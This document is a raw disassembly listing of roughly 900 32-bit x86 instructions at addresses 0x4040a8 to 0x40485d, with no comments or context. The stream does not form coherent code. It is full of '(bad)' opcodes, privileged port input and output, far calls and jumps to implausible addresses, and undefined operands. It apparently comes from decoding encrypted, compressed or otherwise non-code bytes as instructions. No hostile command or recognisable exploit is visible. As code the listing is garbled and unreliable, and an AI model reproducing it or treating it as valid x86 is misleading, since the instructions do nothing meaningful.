  4040a8:	pop    ecx
  4040a9:	aaa    
  4040aa:	pop    esi
  4040ab:	lahf   
  4040ac:	out    dx,eax
  4040ad:	pusha  
  4040ae:	es add eax,0x60116325
  4040b4:	adc    DWORD PTR [eax+0x70],esi
  4040b7:	in     eax,0xd3
  4040b9:	sahf   
  4040ba:	mov    bh,0x3a
  4040bc:	xchg   esi,eax
  4040bd:	jp     0x404051
  4040bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040c0:	jp     0x404066
  4040c2:	sbb    BYTE PTR [esi-0x24],ah
  4040c5:	dec    ebp
  4040c6:	call   0x1677:0xe396ed40
  4040cd:	mov    esp,0x25281cb3
  4040d2:	cs iret 
  4040d4:	adc    edx,DWORD PTR [ecx-0x9]
  4040d7:	cmp    DWORD PTR [esi-0x48],ebp
  4040da:	pop    eax
  4040db:	retf   0xedf0
  4040de:	inc    al
  4040e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040e1:	jb     0x404092
  4040e3:	or     cl,dh
  4040e5:	rcl    BYTE PTR [ecx-0x502a9938],1
  4040eb:	aam    0x8c
  4040ed:	dec    ebx
  4040ee:	sub    ecx,edx
  4040f0:	pop    ss
  4040f1:	jne    0x4040cc
  4040f3:	xchg   ebp,eax
  4040f4:	ins    BYTE PTR es:[edi],dx
  4040f5:	xchg   ah,dl
  4040f7:	or     cl,BYTE PTR [ebp-0x394ce764]
  4040fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040fe:	or     edx,DWORD PTR [eax+0xb]
  404101:	fcomp  QWORD PTR [esi+0x274b9bd6]
  404107:	cmp    ebx,DWORD PTR [edx]
  404109:	sub    eax,0x23841ad6
  40410e:	push   esi
  40410f:	lods   al,BYTE PTR ds:[esi]
  404110:	jmp    0x404151
  404112:	mov    ds:0x663a013e,eax
  404117:	(bad)  
  404118:	(bad)  
  404119:	shr    DWORD PTR [esi+0x24],cl
  40411c:	inc    esp
  40411d:	iretw  
  40411f:	les    eax,FWORD PTR [esi+0x73fc9f55]
  404125:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  404127:	cli    
  404128:	jg     0x4040ee
  40412a:	ret    
  40412b:	or     eax,0x469edbd8
  404130:	mov    ebp,0x4f8b3777
  404135:	jmp    0x61844d67
  40413a:	adc    bh,BYTE PTR [edx+0x12]
  40413d:	nop
  40413e:	out    dx,al
  40413f:	xor    DWORD PTR [eax+0x43],ebp
  404142:	sbb    DWORD PTR [esi-0x8],edi
  404145:	cmp    eax,0xa660f13c
  40414a:	mov    ch,0xec
  40414c:	or     eax,0xf5ba2878
  404151:	adc    DWORD PTR [ebx],0xfc07e38b
  404157:	clc    
  404158:	fsub   DWORD PTR [eax-0x67]
  40415b:	jo     0x404102
  40415d:	jecxz  0x4040e7
  40415f:	mov    eax,ds:0xa4056105
  404164:	push   eax
  404165:	jno    0x404162
  404167:	jl     0x4041c2
  404169:	jp     0x4041ae
  40416b:	cs pushw ds
  40416e:	cwde   
  40416f:	jle    0x4040fe
  404171:	add    DWORD PTR [eax-0x50669c6f],edi
  404177:	out    0xfd,eax
  404179:	call   0x80b1ce8f
  40417e:	or     DWORD PTR [esi-0x79],edx
  404181:	mov    ds,WORD PTR [esi-0x4e]
  404184:	rcl    DWORD PTR [edx+esi*2+0x7b],0xbd
  404189:	dec    eax
  40418a:	mov    edi,0x8749aa38
  40418f:	mov    ds:0xccfad990,al
  404194:	hlt    
  404195:	pop    ebx
  404196:	xor    esi,ebx
  404198:	ins    DWORD PTR es:[edi],dx
  404199:	xor    dh,BYTE PTR [esi-0x359b038f]
  40419f:	add    eax,0x4c5e86db
  4041a4:	faddp  st(6),st
  4041a6:	loope  0x4041ac
  4041a8:	adc    ah,BYTE PTR [ebx+eiz*2]
  4041ab:	in     al,dx
  4041ac:	mov    dh,0xa0
  4041ae:	and    BYTE PTR [esi-0x6d],al
  4041b1:	adc    BYTE PTR [ebx+0x7c],dh
  4041b4:	xor    al,0xe2
  4041b6:	les    ecx,FWORD PTR [edi+0x39]
  4041b9:	sti    
  4041ba:	adc    eax,0xe1c1dac6
  4041bf:	sbb    DWORD PTR [ebx-0x61],esi
  4041c2:	(bad)  
  4041c3:	ja     0x404162
  4041c5:	rol    BYTE PTR [ebp-0x15ebef77],0xf6
  4041cc:	pop    ds
  4041cd:	ds jae 0x40415e
  4041d0:	mov    ds:0x76dd89c4,eax
  4041d5:	jae    0x40421f
  4041d7:	fs pop esi
  4041d9:	mov    edi,0x8da24f0
  4041de:	and    edx,0xfffffffd
  4041e1:	fyl2x  
  4041e3:	cmc    
  4041e4:	in     al,0x2f
  4041e6:	push   ss
  4041e7:	sbb    eax,0x99a174c2
  4041ec:	sub    dl,BYTE PTR [edx]
  4041ee:	mov    ds:0x46d8e97,al
  4041f3:	xor    ebp,DWORD PTR [eax+0x42]
  4041f6:	mov    gs,WORD PTR [eax]
  4041f8:	lahf   
  4041f9:	rcr    BYTE PTR [esi],cl
  4041fb:	inc    edx
  4041fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041fd:	call   0x9da760cb
  404202:	pop    esi
  404203:	jp     0x404251
  404205:	fdivr  st(0),st
  404207:	jecxz  0x4041e0
  404209:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40420a:	or     DWORD PTR [ebp-0x42],esp
  40420d:	and    al,0x1f
  404210:	ss pop ss
  404212:	je     0x404257
  404214:	xchg   edi,eax
  404215:	mov    eax,ds:0x24c20735
  40421a:	add    al,0x95
  40421c:	fwait
  40421d:	repz inc ecx
  40421f:	pushf  
  404220:	mov    bh,0x14
  404222:	xor    al,BYTE PTR ds:0x7828281c
  404228:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404229:	out    dx,al
  40422a:	mov    edi,0x75fc1a8f
  40422f:	mov    eax,0x1bd6f0d5
  404234:	jmp    0xbd40427d
  404239:	pop    ecx
  40423a:	or     esi,DWORD PTR [ecx]
  40423c:	add    ah,BYTE PTR [ebx]
  40423e:	call   0x19b8bbaf
  404243:	dec    esi
  404244:	sbb    cl,ah
  404246:	inc    esi
  404247:	nop
  404248:	add    dl,bl
  40424a:	push   esp
  40424b:	out    0x27,eax
  40424d:	leave  
  40424e:	mov    bl,0x3e
  404250:	dec    edi
  404251:	std    
  404252:	jle    0x404211
  404254:	fstp   TBYTE PTR [ecx+0x6]
  404257:	inc    edx
  404258:	dec    eax
  404259:	ja     0x4042be
  40425b:	unpckhps xmm6,XMMWORD PTR [eax-0x1e]
  40425f:	retf   
  404260:	jl     0x404269
  404262:	or     DWORD PTR [eax+0x2e3f6f37],edi
  404268:	xchg   esp,eax
  404269:	jecxz  0x4042af
  40426b:	and    al,0xb0
  40426d:	imul   ebx,esi,0x73f1b962
  404273:	cmp    al,BYTE PTR [edi-0x10]
  404276:	adc    BYTE PTR [edx-0x27],bl
  404279:	xor    DWORD PTR [ebx+0x329e0395],esi
  40427f:	popa   
  404280:	(bad)  
  404281:	pop    esi
  404282:	xchg   edi,eax
  404283:	adc    BYTE PTR [ebp+0x7c],dl
  404286:	sahf   
  404287:	cs aad 0xb5
  40428a:	inc    edx
  40428b:	xor    DWORD PTR [ebx-0x17755772],edx
  404291:	sub    al,0x18
  404293:	lahf   
  404294:	hlt    
  404295:	pop    eax
  404296:	jne    0x4042a3
  404298:	pop    ebx
  404299:	adc    ecx,ebp
  40429b:	xlat   BYTE PTR ds:[ebx]
  40429c:	ret    
  40429d:	add    al,0x4e
  40429f:	(bad)  [ebx-0x54]
  4042a2:	ficom  DWORD PTR [ebx+0x2039cba8]
  4042a8:	fwait
  4042a9:	pop    edi
  4042aa:	mov    esi,0x89376e83
  4042af:	outs   dx,BYTE PTR ds:[esi]
  4042b0:	test   BYTE PTR ds:0xdbf8b796,al
  4042b6:	pop    esp
  4042b7:	push   ecx
  4042b8:	xlat   BYTE PTR ds:[ebx]
  4042b9:	sub    ebx,DWORD PTR [ecx-0xf6dc14b]
  4042bf:	gs xchg ebx,eax
  4042c1:	ret    
  4042c2:	(bad)  
  4042c3:	jg     0x40428f
  4042c5:	push   esp
  4042c6:	fcomp  QWORD PTR [eax+0x2651daf7]
  4042cc:	pop    eax
  4042cd:	push   esp
  4042ce:	add    ebp,ecx
  4042d0:	loopne 0x4042bb
  4042d2:	mov    eax,DWORD PTR [edx+ebp*1+0x5f7fd722]
  4042d9:	js     0x40430b
  4042db:	sti    
  4042dc:	push   edi
  4042dd:	mov    ecx,DWORD PTR [edi]
  4042df:	mov    ?,WORD PTR [edx+0x79]
  4042e2:	daa    
  4042e3:	jno    0x4042f5
  4042e5:	arpl   WORD PTR [esi+ebp*8-0x3d],ax
  4042e9:	(bad)  
  4042ea:	ss addr16 dec eax
  4042ed:	xor    dh,BYTE PTR [ebp+0x53]
  4042f0:	call   0x3eaef8f3
  4042f5:	mov    ds:0xc8b461e4,eax
  4042fa:	and    DWORD PTR [esi],edx
  4042fc:	adc    ebp,0xe
  4042ff:	cli    
  404300:	inc    edi
  404301:	ja     0x404381
  404303:	xchg   esi,eax
  404304:	mov    ah,0x94
  404306:	jp     0x404353
  404308:	addr16 mov ds:0x5cdb,eax
  40430c:	aaa    
  40430d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40430e:	arpl   WORD PTR [ebp-0x548bd9ae],di
  404314:	dec    esi
  404315:	or     al,BYTE PTR [esi+0x26dea2b0]
  40431b:	and    ebx,eax
  40431d:	test   ecx,ebp
  40431f:	push   ecx
  404320:	lock and ch,BYTE PTR [edi-0x56]
  404324:	aad    0xe1
  404326:	(bad)  
  404328:	nop
  404329:	adc    al,0x7b
  40432b:	outs   dx,BYTE PTR ds:[esi]
  40432c:	and    BYTE PTR [ebx],bl
  40432e:	pusha  
  40432f:	fs jmp 0x2755:0x3aa6313c
  404337:	add    dl,BYTE PTR [eax]
  404339:	and    eax,0xee8e9723
  40433e:	mov    al,0xe0
  404340:	cwde   
  404341:	mov    ch,0x41
  404343:	mov    al,ds:0xbe0d19f7
  404348:	add    al,0x7d
  40434a:	sti    
  40434b:	dec    eax
  40434c:	in     eax,0x94
  40434e:	in     eax,0x1d
  404350:	ficom  DWORD PTR [eax+0x4f]
  404353:	arpl   WORD PTR [esp+edi*1+0x45c1d0c2],bx
  40435a:	lods   eax,DWORD PTR ds:[esi]
  40435b:	cli    
  40435c:	stos   DWORD PTR es:[edi],eax
  40435d:	into   
  40435e:	xchg   ebp,eax
  40435f:	mov    ds:0xb6f7f9a2,eax
  404364:	sub    al,0x78
  404366:	xor    dl,BYTE PTR [edi-0x1d9413e8]
  40436c:	(bad)  
  40436d:	jl     0x404340
  40436f:	mov    WORD PTR [eax],?
  404371:	iret   
  404372:	and    eax,0xb1ef674d
  404377:	add    cl,ah
  404379:	jb     0x4043c2
  40437b:	cmp    al,0x80
  40437d:	pop    es
  40437e:	mov    ecx,0xa7f612a1
  404383:	and    al,0x56
  404385:	(bad)  
  404386:	sbb    al,BYTE PTR [esi-0x45]
  404389:	in     al,dx
  40438a:	(bad)  
  40438b:	cli    
  40438c:	mov    dl,0x42
  40438e:	imul   DWORD PTR [ebp+0x14]
  404391:	inc    esi
  404392:	sub    cl,ch
  404394:	cmc    
  404395:	lock adc al,BYTE PTR [ecx+0x6d03fce1]
  40439c:	out    0x1,al
  40439e:	or     esp,ebx
  4043a0:	out    0x9,eax
  4043a2:	outs   dx,DWORD PTR ds:[esi]
  4043a3:	dec    esi
  4043a4:	pop    ss
  4043a5:	sub    esi,DWORD PTR [ebx+0x2a]
  4043a8:	hlt    
  4043a9:	loop   0x404382
  4043ab:	aas    
  4043ac:	push   ebp
  4043ad:	stos   DWORD PTR es:[edi],eax
  4043ae:	clc    
  4043af:	mov    al,0x65
  4043b1:	popa   
  4043b2:	or     edx,ebp
  4043b4:	popf   
  4043b5:	clc    
  4043b6:	aaa    
  4043b7:	sbb    ah,BYTE PTR [edi-0x69ea7ee4]
  4043bd:	in     al,dx
  4043be:	cmp    bh,cl
  4043c0:	inc    esi
  4043c1:	inc    esi
  4043c2:	shl    DWORD PTR [eax],cl
  4043c4:	pushf  
  4043c5:	inc    eax
  4043c6:	aaa    
  4043c7:	dec    ebp
  4043c8:	pop    edx
  4043c9:	push   cs
  4043ca:	inc    esi
  4043cb:	jmp    0x4043bd
  4043cd:	retf   0x6bdc
  4043d0:	retf   0x5a4a
  4043d3:	rol    al,cl
  4043d5:	pop    ebx
  4043d6:	sub    DWORD PTR [esi-0x29fc3938],0xb9f38e1
  4043e0:	mov    dh,0x79
  4043e2:	(bad)  
  4043e3:	mov    bl,0xc8
  4043e5:	xchg   ebx,eax
  4043e6:	mov    ch,bh
  4043e8:	xchg   BYTE PTR [edx+0x3450db2a],ch
  4043ee:	fisttp QWORD PTR [ebx+0x258c492a]
  4043f4:	and    al,0xcc
  4043f6:	push   eax
  4043f7:	xchg   esi,eax
  4043f8:	gs and eax,0xb92ecc1e
  4043fe:	pop    ecx
  4043ff:	xchg   BYTE PTR [edx],al
  404401:	imul   ecx,DWORD PTR [ebx],0x4
  404404:	arpl   sp,di
  404406:	in     eax,0x0
  404408:	cmp    esp,DWORD PTR [ecx-0x3c]
  40440b:	cmp    bh,bl
  40440d:	mov    ebp,DWORD PTR [eax+0x13]
  404410:	mov    ss:0xef3e6769,al
  404416:	ret    0xfc3a
  404419:	lahf   
  40441a:	fcomp  st(3)
  40441c:	dec    esi
  40441d:	sbb    esp,DWORD PTR [edi-0x2950537e]
  404423:	add    al,0x59
  404425:	loop   0x404443
  404427:	mov    ebp,0xdd90d8
  40442c:	fs add ecx,ebx
  40442f:	jecxz  0x404484
  404431:	dec    edi
  404432:	or     DWORD PTR [eax+ebx*8+0x36258ecf],eax
  404439:	cmp    DWORD PTR [esi+0x41],ebp
  40443c:	mov    bh,0x6d
  40443e:	(bad)  
  40443f:	stc    
  404440:	inc    eax
  404441:	not    BYTE PTR [eax]
  404443:	loope  0x4043e6
  404445:	cmp    dh,BYTE PTR [edx]
  404447:	add    al,al
  404449:	dec    esp
  40444a:	push   ebx
  40444b:	dec    ecx
  40444c:	cli    
  40444d:	push   ecx
  40444e:	imul   BYTE PTR [edi+esi*1-0x67]
  404452:	sub    esp,DWORD PTR [eax]
  404454:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404455:	and    DWORD PTR [ebp+0x1f557247],eax
  40445b:	inc    edi
  40445c:	and    ecx,DWORD PTR ds:0x8c87b85e
  404462:	jno    0x404460
  404464:	or     al,BYTE PTR [edx+0x639490c6]
  40446a:	in     al,0xc5
  40446c:	fsub   st(5),st
  40446e:	cmp    al,0xb0
  404470:	rcr    DWORD PTR [edx],cl
  404472:	jle    0x404487
  404474:	cs jbe 0x4044d7
  404477:	pop    ecx
  404478:	cmc    
  404479:	jmp    0x7103:0x1d25d4e9
  404480:	daa    
  404481:	out    0x58,eax
  404483:	sar    BYTE PTR [edi-0x1a],cl
  404486:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404487:	cmp    bl,BYTE PTR [ecx+0x56f6667]
  40448d:	adc    DWORD PTR [ebp+0x20],ebx
  404490:	push   es
  404491:	pushf  
  404492:	or     eax,0x833be286
  404497:	rcl    dl,1
  404499:	cmp    DWORD PTR [ebx],edx
  40449b:	sbb    eax,0xf4ed7019
  4044a0:	cmp    dl,dl
  4044a2:	inc    esi
  4044a3:	mov    ebp,0x22405a8a
  4044a8:	gs dec edx
  4044aa:	pop    ss
  4044ab:	dec    eax
  4044ac:	les    ebp,FWORD PTR [ecx+0x14]
  4044af:	jnp    0x4044d3
  4044b1:	mov    eax,ds:0x949be998
  4044b6:	mov    eax,ds:0xd3d9b044
  4044bb:	jmp    0x404441
  4044bd:	test   al,0xb7
  4044bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044c0:	sub    eax,0x57e1601
  4044c5:	add    al,0xd2
  4044c7:	add    bl,BYTE PTR ds:0xf4fefb2e
  4044cd:	je     0x4044ce
  4044cf:	push   ds
  4044d0:	pop    ebx
  4044d1:	or     al,0x44
  4044d3:	dec    ebp
  4044d4:	xor    bl,BYTE PTR [ebp+0x52]
  4044d7:	sub    ebp,esi
  4044d9:	sub    edx,esp
  4044db:	xor    edi,DWORD PTR [ebp-0x77b1243a]
  4044e1:	jns    0x404553
  4044e3:	(bad)  
  4044e4:	fldcw  WORD PTR [ecx]
  4044e6:	jl     0x40448f
  4044e8:	stos   DWORD PTR es:[edi],eax
  4044e9:	ins    BYTE PTR es:[edi],dx
  4044ea:	pop    es
  4044eb:	mov    ch,0x6b
  4044ed:	sub    eax,0x9d1ced68
  4044f2:	bound  eax,QWORD PTR [ecx+edi*4+0xc929688]
  4044f9:	(bad)  
  4044fa:	sub    BYTE PTR [edx+0x5cb51d48],cl
  404500:	or     al,0xf2
  404502:	scas   eax,DWORD PTR es:[edi]
  404503:	jnp    0x4044b6
  404505:	ror    edx,0xc1
  404508:	inc    esp
  404509:	sti    
  40450a:	rcr    BYTE PTR [eax+eiz*4],cl
  40450d:	ins    DWORD PTR es:[edi],dx
  40450e:	mov    ch,0x1f
  404510:	push   ds
  404511:	les    esp,FWORD PTR [ecx+0x2a]
  404514:	xchg   ecx,eax
  404515:	mov    ds:0xd9a87dda,eax
  40451a:	outs   dx,DWORD PTR ds:[esi]
  40451b:	cmc    
  40451c:	fidiv  DWORD PTR [edx-0x4ae685a5]
  404522:	cmp    BYTE PTR [ebx+0x251a6123],dl
  404528:	mov    esi,0x54d97991
  40452d:	stos   DWORD PTR es:[edi],eax
  40452e:	xor    al,0x48
  404530:	sub    al,0xf6
  404532:	push   ss
  404533:	lock mov edx,0xe7938700
  404539:	mov    ds:0xf1a734dd,al
  40453e:	cld    
  40453f:	pop    edi
  404540:	pop    es
  404541:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404542:	out    dx,al
  404543:	adc    ch,BYTE PTR [esi+0x53]
  404546:	lods   eax,DWORD PTR ds:[esi]
  404547:	push   ds
  404548:	iret   
  404549:	leave  
  40454a:	xchg   esi,eax
  40454b:	in     eax,0xc2
  40454d:	fld    TBYTE PTR [esi-0x41]
  404550:	inc    edx
  404551:	sbb    eax,DWORD PTR [ecx-0x228739ec]
  404557:	jge    0x4045a4
  404559:	and    BYTE PTR [ecx+0x45b01abd],dl
  40455f:	jecxz  0x4045bb
  404561:	xor    BYTE PTR [ecx-0x36],0xab
  404565:	mov    al,0x85
  404567:	mov    ah,0x25
  404569:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40456a:	imul   esi,eax,0x1
  40456d:	test   eax,0x39d0eb55
  404572:	icebp  
  404573:	and    DWORD PTR [edi-0x34],edi
  404576:	cmp    BYTE PTR [edx],dl
  404578:	std    
  404579:	push   ecx
  40457a:	and    eax,0x7c712800
  40457f:	sub    bl,0x11
  404582:	pop    eax
  404583:	loope  0x404570
  404585:	das    
  404586:	sbb    ebp,edi
  404588:	cmp    eax,0x240781be
  40458d:	fisttp WORD PTR ds:0xe158e016
  404593:	and    edx,0x34
  404596:	sub    BYTE PTR [edi+0x2f0dabc8],0xa8
  40459d:	test   DWORD PTR [ebx-0x71],edi
  4045a0:	or     al,0xc8
  4045a2:	stos   BYTE PTR es:[edi],al
  4045a3:	xor    al,ch
  4045a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045a6:	repnz es jecxz 0x404599
  4045aa:	push   es
  4045ab:	xchg   BYTE PTR [esi+0x6a5bfd4d],al
  4045b1:	push   ebx
  4045b2:	or     cl,dh
  4045b4:	sbb    ah,BYTE PTR [ebx-0x45cafaa3]
  4045ba:	outs   dx,DWORD PTR ds:[esi]
  4045bb:	mov    ch,0x4c
  4045bd:	mov    ecx,0xb9e4b673
  4045c2:	pop    ds
  4045c3:	in     al,0x79
  4045c5:	call   0x4a26:0x56fc4bed
  4045cc:	nop
  4045cd:	test   DWORD PTR [ebx+0x17],ebx
  4045d0:	cmp    eax,0xbdef642a
  4045d5:	scas   eax,DWORD PTR es:[edi]
  4045d6:	mov    esi,0x149e10f4
  4045db:	(bad)  
  4045dc:	sub    al,0x55
  4045de:	sbb    eax,0xd47e9e4
  4045e3:	leave  
  4045e4:	push   edi
  4045e5:	mov    WORD PTR [esi+0x29],?
  4045e8:	cmp    esp,DWORD PTR [eax-0x65]
  4045eb:	out    dx,al
  4045ec:	ret    0x24e7
  4045ef:	mov    ch,0xb3
  4045f1:	pusha  
  4045f2:	ret    0xb64d
  4045f5:	push   ss
  4045f6:	popa   
  4045f7:	out    0x2e,eax
  4045f9:	pushf  
  4045fa:	mov    eax,0x7b722a61
  4045ff:	call   0xe2dbdc79
  404604:	push   cs
  404605:	mov    ds:0x62e15cd4,eax
  40460a:	shr    al,1
  40460c:	lock mov WORD PTR [edi],ss
  40460f:	mov    ebx,0xaabd5ec6
  404614:	popf   
  404615:	pusha  
  404616:	loop   0x4045f4
  404618:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404619:	out    0x59,eax
  40461b:	dec    esi
  40461c:	xor    ebx,DWORD PTR [eax-0x644b2120]
  404622:	es aas 
  404624:	aam    0x9e
  404626:	gs data16 jecxz 0x404616
  40462a:	sub    DWORD PTR [ebp-0x3c],0xcda0a5e5
  404631:	mov    eax,0x38db30c3
  404636:	dec    esp
  404637:	mov    ch,BYTE PTR [ebp+0x70]
  40463a:	pop    es
  40463b:	ret    0x3eac
  40463e:	test   al,0x7c
  404640:	or     DWORD PTR [esi-0x2c6e6c5e],esp
  404646:	pop    ss
  404647:	add    eax,0xea7b7779
  40464c:	fs sub eax,0x21677d6c
  404652:	loop   0x404612
  404654:	inc    esp
  404655:	sub    ch,BYTE PTR [eax]
  404657:	icebp  
  404658:	sbb    DWORD PTR [edx+ebx*2+0x2f],0x66f6f622
  404660:	sbb    BYTE PTR [edi],ah
  404662:	mov    WORD PTR [ebp-0x19f49c8],es
  404668:	imul   ebp,ecx,0xffffffa1
  40466b:	nop
  40466c:	sbb    ebp,DWORD PTR [ebx]
  40466e:	sbb    ah,BYTE PTR [edi-0x36]
  404671:	sub    BYTE PTR [ebx],dh
  404673:	push   eax
  404674:	xchg   DWORD PTR [ebx-0x9fd350c],edi
  40467a:	sti    
  40467b:	jbe    0x404685
  40467d:	fisttp DWORD PTR [eax-0x3f]
  404680:	or     eax,DWORD PTR [edi-0x1c]
  404683:	inc    esp
  404684:	ja     0x404660
  404686:	cmp    eax,0xe6ae591c
  40468b:	mov    esi,0x84436599
  404690:	sbb    edi,DWORD PTR [edx+0x209c340e]
  404696:	nop
  404697:	pop    ds
  404698:	scas   al,BYTE PTR es:[edi]
  404699:	aam    0x28
  40469b:	leave  
  40469c:	and    al,0xab
  40469e:	(bad)  
  40469f:	test   BYTE PTR [esi-0x3d],0x3d
  4046a3:	pop    edi
  4046a4:	cmp    DWORD PTR [edx-0x41],esi
  4046a7:	inc    ebp
  4046a8:	and    al,0x98
  4046aa:	aam    0x9d
  4046ac:	xchg   DWORD PTR [edi+0x3],edi
  4046af:	mov    esp,0x5273c206
  4046b4:	adc    BYTE PTR [esi],cl
  4046b6:	push   cs
  4046b7:	sar    BYTE PTR [edx],0xb8
  4046ba:	or     BYTE PTR [ebp+esi*8-0x47b5fe35],0x8e
  4046c2:	xlat   BYTE PTR ds:[ebx]
  4046c3:	loope  0x404656
  4046c5:	ins    DWORD PTR es:[edi],dx
  4046c6:	test   ebp,ebp
  4046c8:	dec    esi
  4046c9:	xor    ebx,DWORD PTR [edi-0x35]
  4046cc:	je     0x4046e9
  4046ce:	jnp    0x40470b
  4046d0:	push   es
  4046d1:	ss ins DWORD PTR es:[edi],dx
  4046d3:	bound  edi,QWORD PTR [edx+ebx*4+0x7a]
  4046d7:	lds    ebp,FWORD PTR [ebp+0x7e8b526f]
  4046dd:	jg     0x40471c
  4046df:	xlat   BYTE PTR ds:[ebx]
  4046e0:	scas   al,BYTE PTR es:[edi]
  4046e1:	mov    edx,0x6b87a464
  4046e6:	outs   dx,DWORD PTR ds:[esi]
  4046e7:	push   ds
  4046e8:	pop    edx
  4046e9:	sub    eax,0x90365b77
  4046ee:	adc    eax,0x335ec85e
  4046f3:	jp     0x40472f
  4046f5:	jle    0x40476d
  4046f7:	pop    ebp
  4046f8:	dec    edx
  4046f9:	pusha  
  4046fa:	jge    0x40469d
  4046fc:	push   eax
  4046fd:	pop    ecx
  4046fe:	pop    ds
  4046ff:	jle    0x4046f5
  404701:	icebp  
  404702:	lods   al,BYTE PTR ds:[esi]
  404703:	push   eax
  404704:	shr    DWORD PTR [edx+0x2e],1
  404707:	add    eax,0x36f80a28
  40470c:	ret    0x3a0c
  40470f:	cmc    
  404710:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404711:	pop    ecx
  404712:	pop    edi
  404713:	ret    
  404714:	fisttp QWORD PTR [ecx+0x33e846bc]
  40471a:	ror    dl,1
  40471c:	test   esi,ebp
  40471e:	repnz fsubr DWORD PTR [edi+ecx*1]
  404722:	dec    esi
  404723:	shr    dl,cl
  404725:	mov    ah,0x57
  404727:	dec    ebp
  404728:	enter  0xd935,0x4c
  40472c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40472d:	jae    0x4046e3
  40472f:	cwde   
  404730:	mov    dl,BYTE PTR [eax+0x73009ccc]
  404736:	jecxz  0x4046c8
  404738:	xor    al,0xb0
  40473a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40473b:	dec    ebx
  40473c:	ja     0x404797
  40473e:	rcl    dl,0xad
  404741:	neg    BYTE PTR [esp+ebx*8+0x765fedca]
  404748:	sub    BYTE PTR [edx+0x395bef7a],cl
  40474e:	popf   
  40474f:	je     0x4046de
  404751:	xchg   edx,eax
  404752:	push   eax
  404753:	xor    BYTE PTR [esi-0x12d5cf8e],0xce
  40475a:	lea    ecx,[edi+0x22]
  40475d:	int    0xf8
  40475f:	mov    ch,0x4
  404761:	mov    ch,0x44
  404763:	repnz out 0x89,eax
  404766:	push   eax
  404767:	retf   0x30ca
  40476a:	and    al,0x6c
  40476c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40476d:	mov    DWORD PTR [edx-0x7b25e8d7],esp
  404773:	pop    esi
  404774:	pop    edx
  404775:	ds das 
  404777:	pand   mm6,mm6
  40477a:	adc    BYTE PTR [ebx*8-0x2f980365],dh
  404781:	xchg   esi,eax
  404782:	mov    BYTE PTR [ecx+ebp*8+0x9],bh
  404786:	and    dl,BYTE PTR [esi+eiz*8-0x7b]
  40478a:	sub    bh,BYTE PTR [esi+0x33]
  40478d:	push   ebx
  40478e:	hlt    
  40478f:	mov    ah,0x20
  404791:	ds jp  0x40476e
  404794:	jnp    0x40472a
  404796:	dec    esi
  404797:	or     BYTE PTR [ebp+eiz*8+0x58],ah
  40479b:	aaa    
  40479c:	pop    eax
  40479d:	push   ss
  40479e:	xchg   BYTE PTR [esi-0x4],bl
  4047a1:	inc    esi
  4047a2:	or     eax,0x924ab08
  4047a7:	ja     0x404748
  4047a9:	sbb    eax,DWORD PTR [ebx+0x39]
  4047ac:	jge    0x404745
  4047ae:	ret    
  4047af:	pop    ecx
  4047b0:	(bad)  
  4047b1:	jmp    0xff4ba970
  4047b6:	in     al,0x76
  4047b8:	and    al,0xa4
  4047ba:	or     DWORD PTR ds:0xa56037cd,0x6b
  4047c1:	test   al,0xc4
  4047c3:	push   ss
  4047c4:	jmp    0x57cf2000
  4047c9:	ins    BYTE PTR es:[edi],dx
  4047ca:	jns    0x4047b2
  4047cc:	jns    0x4047e2
  4047ce:	push   ss
  4047cf:	jbe    0x4047ec
  4047d1:	test   DWORD PTR ds:0xdee50e23,esi
  4047d7:	cld    
  4047d8:	cld    
  4047d9:	add    ebx,DWORD PTR fs:[ecx-0x2a548229]
  4047e0:	lock rcl BYTE PTR [esi-0x1d],cl
  4047e4:	dec    ebx
  4047e6:	(bad)  
  4047e7:	pop    ss
  4047e8:	fucomip st,st(0)
  4047ea:	cmp    eax,0x36771ccc
  4047ef:	mov    edi,0xd097883e
  4047f4:	and    dh,BYTE PTR [ebx+eax*2+0x3d]
  4047f8:	mov    ah,al
  4047fa:	sbb    eax,0x91039fae
  4047ff:	and    dl,BYTE PTR [ebx+ebx*2-0x70a6630e]
  404806:	daa    
  404807:	cdq    
  404808:	mov    dl,0xda
  40480a:	aas    
  40480b:	ins    BYTE PTR es:[edi],dx
  40480c:	dec    ecx
  40480d:	shr    DWORD PTR [ebx],0xf4
  404810:	gs outs dx,BYTE PTR ss:[esi]
  404813:	adc    ecx,DWORD PTR [edx]
  404815:	int    0x14
  404817:	gs sub eax,0x718806f
  40481d:	pop    ss
  40481e:	clc    
  40481f:	test   BYTE PTR [edx],ah
  404821:	jle    0x4047d1
  404823:	jge    0x4047b3
  404825:	cmp    bl,dh
  404827:	jg     0x404837
  404829:	cmp    BYTE PTR [edx+0x5d],dl
  40482c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40482d:	scas   al,BYTE PTR es:[edi]
  40482e:	stos   BYTE PTR es:[edi],al
  40482f:	dec    ebp
  404830:	in     al,0x70
  404832:	es das 
  404834:	pop    ebp
  404835:	pop    ebp
  404836:	aaa    
  404837:	push   eax
  404838:	mov    esi,0x2cf309b
  40483d:	mov    cl,0x15
  40483f:	fsubr  QWORD PTR [edi+ebx*1-0x65]
  404843:	test   DWORD PTR [ecx],esi
  404845:	int3   
  404846:	cli    
  404847:	jns    0x4047f1
  404849:	add    DWORD PTR [ebx-0x6e],0xe04c8291
  404850:	push   edx
  404851:	ficom  WORD PTR [edx-0x5a02e3fc]
  404857:	sub    ecx,DWORD PTR [eax+0x14c858fc]
  40485d:	clc    
